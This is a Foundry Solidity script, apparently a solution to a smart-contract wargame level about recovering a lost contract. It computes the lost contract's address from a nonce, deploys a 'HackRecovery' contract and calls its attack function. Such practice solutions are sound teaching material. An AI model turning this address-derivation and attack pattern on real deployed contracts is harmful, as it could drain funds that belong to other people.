// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import { HackRecovery } from "../../contracts/solutions/HackRecovery.sol";

contract RecoveryScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("ACCOUNT_PRIVATE_KEY");
        address levelInstanceAddress = vm.envAddress("CONTRACT_INSTANCE_ADDRESS");
        uint256 nonce = (vm.getNonce(levelInstanceAddress) - 1);
        console.log(nonce);
        address _lostAccount = computeCreateAddress(levelInstanceAddress, nonce);
        vm.startBroadcast(deployerPrivateKey);

        HackRecovery hackRecovery = new HackRecovery();

        hackRecovery.attack(_lostAccount);

        vm.stopBroadcast();

    }
}